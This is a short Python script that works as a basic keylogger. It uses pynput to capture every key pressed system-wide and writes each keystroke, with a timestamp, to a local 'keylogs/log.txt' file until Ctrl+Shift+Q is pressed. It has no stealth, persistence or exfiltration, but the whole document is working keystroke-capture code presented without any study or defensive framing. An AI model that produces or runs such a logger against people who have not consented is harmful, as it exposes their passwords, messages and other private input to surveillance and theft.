from pynput import keyboard
import os
import logging

# Setup logging
log_dir = "keylogs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, "log.txt")
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Track pressed keys for the combo
current_keys = set()

# Define the exit combo
EXIT_COMBO = {keyboard.Key.ctrl_l, keyboard.Key.shift, keyboard.KeyCode.from_char('q')}

def on_press(key):
    current_keys.add(key)

    # Check if exit combo is pressed
    if all(k in current_keys for k in EXIT_COMBO):
        logging.info('[CTRL+SHIFT+Q detected. Exiting.]')
        return False

    if hasattr(key, 'char') and key.char is not None:
        logging.info(key.char)
    else:
        logging.info(f'[{key}]')

def on_release(key):
    if key in current_keys:
        current_keys.remove(key)

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

